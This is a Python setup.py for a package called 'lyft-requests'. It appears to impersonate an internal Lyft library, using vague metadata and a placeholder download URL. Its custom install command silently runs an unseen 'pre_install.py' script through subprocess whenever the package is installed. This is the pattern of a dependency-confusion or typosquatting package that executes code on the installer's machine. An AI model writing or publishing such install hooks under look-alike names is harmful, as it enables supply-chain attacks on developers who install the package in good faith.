from distutils.core import setup
from setuptools import setup
from setuptools.command.install import install
import subprocess

class CustomInstall(install):
    def run(self):
        # Execute your pre_install.py script
        subprocess.run(["python", "pre_install.py"])
        # Call the original install command using super()
        super().run()

setup(
  name = 'lyft-requests',      
  packages = ['lyft-requests'],  
  version = '5.6',      
  license='MIT',        
  description = 'Lyft service',  
  author = 'SherlocksHat',              
  author_email = 'sherlockshat007@gmail.com',    
  url = 'https://github.com/user/sherlockshat',  
  download_url = 'http://notapplicable.notapplicable',   
  keywords = ['Lyft', 'FRONTEND'], 
  install_requires=[],
  classifiers=[
    'Development Status :: 3 - Alpha', 
    'Intended Audience :: Developers', 
    'Topic :: Software Development :: Build Tools',
    'License :: OSI Approved :: MIT License',  
    'Programming Language :: Python :: 3',   
    'Programming Language :: Python :: 3.4',
    'Programming Language :: Python :: 3.5',
    'Programming Language :: Python :: 3.6',
  ],
   cmdclass={'install': CustomInstall},
)
